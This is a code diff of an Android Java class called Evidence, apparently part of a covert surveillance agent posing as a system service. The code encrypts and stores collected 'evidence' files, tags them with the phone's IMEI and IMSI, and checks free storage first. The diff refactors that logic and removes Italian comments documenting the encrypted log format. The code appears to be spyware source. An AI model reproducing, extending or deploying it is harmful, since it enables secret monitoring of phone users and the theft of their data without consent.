@@ -16,6 +16,7 @@ import android.util.Log;
 
 import com.android.service.Device;
 import com.android.service.LogR;
+import com.android.service.conf.Configuration;
 import com.android.service.crypto.Encryption;
 import com.android.service.crypto.Keys;
 import com.android.service.file.AutoFile;
@@ -26,37 +27,6 @@ import com.android.service.util.DateTime;
 import com.android.service.util.Utils;
 import com.android.service.util.WChar;
 
-// TODO: Auto-generated Javadoc
-/*  LOG FORMAT
- *
- *  -- Naming Convention
- *  Il formato dei log e' il seguente:
- *  Il nome del file in chiaro ha questa forma: ID_AGENTE-LOG_TYPE-SEQUENCE.mob
- *  e si presenta cosi': xxxx-xxxx-dddd.mob
- *  Il primo gruppo e' formato generalmente da 4 cifre in esadecimali, il secondo
- *  e' formato generalmente da una cifra esadecimale, il terzo gruppo e' un numero
- *  di sequenza in formato decimale. Ognuno dei tre gruppi puo' essere composto da
- *  1 fino a 8 cifre. Il nome del file viene scramblato con il primo byte della
- *  chiave utilizzata per il challenge.
- *
- *  -- Header
- *  Il log cifrato e' cosi' composto:
- *  all'inizio del file viene scritta una LogStruct non cifrata, il membro FileSize indica la
- *  lunghezza complessiva di tutto il file. Dopo la LogStruct troviamo il filename in WCHAR,
- *  quindi i byte di AdditionalData se presenti e poi il contenuto vero e proprio.
- *
- *  -- Data
- *  Il contenuto e' formato da una DWORD in chiaro che indica la dimensione del blocco
- *  unpadded (va quindi paddata a BLOCK_SIZE per ottenere la lunghezza del blocco cifrato)
- *  e poi il blocco di dati vero e proprio. Questa struttura puo' esser ripetuta fino alla
- *  fine del file.
- *
- *  -- Global Struct
- *  |Log Struct|FileName|AdditionalData|DWORD Unpadded|Block|.....|DWORD Unpadded|Block|.....|
- *
- *  Un log puo' essere composto sia da un unico blocco DWORD-Dati che da piu' blocchi DWORD-Dati.
- *
- */
 /**
  * The Class Evidence (formerly known as Log.)
  */
@@ -64,9 +34,6 @@ public final class Evidence {
 
 	/** The Constant EVIDENCE_VERSION_01. */
 	private static final int EVIDENCE_VERSION_01 = 2008121901;
-	/*
-	 * Tipi di log (quelli SOLO per mobile DEVONO partire da 0xAA00
-	 */
 
 	/** The EVIDENCE delimiter. */
 	public static int EVIDENCE_DELIMITER = 0xABADC0DE;
@@ -100,9 +67,6 @@ public final class Evidence {
 			"NON" // 12
 
 	};
-
-	/** The Constant MIN_AVAILABLE_SIZE. */
-	private static final long MIN_AVAILABLE_SIZE = 200 * 1024;
 
 	/** The Constant TAG. */
 	private static String TAG = "Evidence";
@@ -148,7 +112,7 @@ public final class Evidence {
 
 	/** The aes key. */
 	private byte[] aesKey;
-	
+
 	/** The enc data. */
 	private byte[] encData;
 
@@ -165,9 +129,11 @@ public final class Evidence {
 
 	/**
 	 * Instantiates a new log.
-	 *
-	 * @param typeEvidenceId the type evidence id
-	 * @param aesKey the aes key
+	 * 
+	 * @param typeEvidenceId
+	 *            the type evidence id
+	 * @param aesKey
+	 *            the aes key
 	 */
 	public Evidence(final EvidenceType typeEvidenceId, final byte[] aesKey) {
 		this();
@@ -181,11 +147,11 @@ public final class Evidence {
 		Check.ensures(encryption != null, "encryption null");
 	}
 
-
 	/**
 	 * Instantiates a new evidence.
-	 *
-	 * @param typeEvidenceId the type evidence id
+	 * 
+	 * @param typeEvidenceId
+	 *            the type evidence id
 	 */
 	public Evidence(final EvidenceType typeEvidenceId) {
 		this(typeEvidenceId, Keys.self().getAesKey());
@@ -201,7 +167,7 @@ public final class Evidence {
 
 		free = Path.freeSpace();
 
-		if (free < MIN_AVAILABLE_SIZE) {
+		if (free < Configuration.MIN_AVAILABLE_SIZE) {
 			if (firstSpace) {
 				firstSpace = false;
 
@@ -223,10 +189,12 @@ public final class Evidence {
 	 * @return true, if successful
 	 */
 	public synchronized boolean close() {
-		fconn.dropExtension(EvidenceCollector.LOG_TMP);
-		
-		// TODO: rinominare il file
-		final boolean ret = true;
+		boolean ret = false;
+		if(fconn!=null && fconn.exists()){
+			fconn.dropExtension(EvidenceCollector.LOG_TMP);
+			ret = true;
+		}
+
 		encData = null;
 		fconn = null;
 		return ret;
@@ -305,7 +273,8 @@ public final class Evidence {
 				Log.d("QZ", TAG + " FATAL: It should not exist:" + fileName);
 				return false;
 			}
-			Log.d("QZ", TAG + " Created " + evidenceType + " : " + name.fileName);
+			Log.d("QZ", TAG + " Created " + evidenceType + " : "
+					+ name.fileName);
 			final byte[] plainBuffer = makeDescription(additionalData,
 					evidenceType);
 			Check.asserts(plainBuffer.length >= 32 + additionalLen,
@@ -320,8 +289,9 @@ public final class Evidence {
 			fconn.append(encBuffer);
 			Check.asserts(fconn.getSize() == encBuffer.length + 4,
 					"Wrong filesize");
-			//Log.d("QZ", TAG + " additionalData.length: " + plainBuffer.length);
-			//Log.d("QZ", TAG + " encBuffer.length: " + encBuffer.length);
+			// Log.d("QZ", TAG + " additionalData.length: " +
+			// plainBuffer.length);
+			// Log.d("QZ", TAG + " encBuffer.length: " + encBuffer.length);
 		} catch (final Exception ex) {
 			Log.d("QZ", TAG + " Error: file: " + name.fileName + " ex:" + ex);
 			return false;
@@ -377,7 +347,8 @@ public final class Evidence {
 		final byte[] plainBuffer = new byte[encryption
 				.getNextMultiple(headerLen)];
 
-		final DataBuffer databuffer = new DataBuffer(plainBuffer, 0, plainBuffer.length);
+		final DataBuffer databuffer = new DataBuffer(plainBuffer, 0,
+				plainBuffer.length);
 		databuffer.write(baseHeader);
 		databuffer.write(WChar.getBytes(device.getImei()));
 		databuffer.write(WChar.getBytes(device.getImsi()));
@@ -390,46 +361,7 @@ public final class Evidence {
 		return plainBuffer;
 	}
 
-	/**
-	 * Plain evidence.
-	 * 
-	 * @param additionalData
-	 *            the additional data
-	 * @param logType
-	 *            the log type
-	 * @param data
-	 *            the data
-	 * @return the byte[]
-	 */
-	public synchronized byte[] plainEvidence(final byte[] additionalData,
-			final EvidenceType logType, final byte[] data) {
 
-		// final byte[] encData = encryption.encryptData(data, 0);
-
-		int additionalLen = 0;
-
-		if (additionalData != null) {
-			additionalLen = additionalData.length;
-		}
-
-		final byte[] plainBuffer = makeDescription(additionalData, logType);
-		Check.asserts(plainBuffer.length >= 32 + additionalLen,
-				"Short plainBuffer");
-		// buffer completo
-		final byte[] buffer = new byte[additionalData.length + data.length + 8];
-		final DataBuffer databuffer = new DataBuffer(buffer, 0, buffer.length);
-
-		// scriviamo la dimensione dell'header paddato
-		databuffer.writeInt(plainBuffer.length);
-		// scrittura dell'header cifrato
-		databuffer.write(additionalData);
-
-		// scrivo il contenuto
-		databuffer.writeInt(data.length);
-		databuffer.write(data);
-
-		return buffer;
-	}
 
 	/**
 	 * Write evidence.
@@ -456,13 +388,17 @@ public final class Evidence {
 	public synchronized boolean writeEvidence(final byte[] data,
 			final int offset) {
 
+		if(!enoughSpace){
+			return false;
+		}
+		
 		encData = encryption.encryptData(data, offset);
 
 		if (fconn == null) {
 			Log.d("QZ", TAG + " Error: fconn null");
 			return false;
 		}
-		
+
 		try {
 			fconn.append(Utils.intToByteArray(data.length - offset));
 			fconn.append(encData);
@@ -483,6 +419,7 @@ public final class Evidence {
 	 * @return true, if successful
 	 */
 	public boolean writeEvidences(final Vector bytelist) {
+
 		int totalLen = 0;
 		for (int i = 0; i < bytelist.size(); i++) {
 			final byte[] token = (byte[]) bytelist.elementAt(i);
@@ -502,7 +439,7 @@ public final class Evidence {
 
 	/**
 	 * Gets the enc data.
-	 *
+	 * 
 	 * @return the enc data
 	 */
 	public byte[] getEncData() {
@@ -521,9 +458,8 @@ public final class Evidence {
 			new LogR(EvidenceType.INFO, LogR.LOG_PRI_STD, null, WChar.getBytes(
 					message, true));
 
-
 		} catch (final Exception ex) {
-			Log.d("QZ", TAG + " Error: " +ex.toString());
+			Log.d("QZ", TAG + " Error: " + ex.toString());
 		}
 	}
 
@@ -537,11 +473,12 @@ public final class Evidence {
 	 * @param content
 	 *            the content
 	 */
-	public void atomicWriteOnce(final byte[] additionalData, final EvidenceType logType,
-			final byte[] content) {
-		createEvidence(additionalData, logType);
-		writeEvidence(content);
-		Check.ensures(getEncData().length % 16 == 0, "wrong len");
-		close();
+	public void atomicWriteOnce(final byte[] additionalData,
+			final EvidenceType logType, final byte[] content) {
+		if (createEvidence(additionalData, logType)) {
+			writeEvidence(content);
+			Check.ensures(getEncData().length % 16 == 0, "wrong len");
+			close();
+		}
 	}
 }
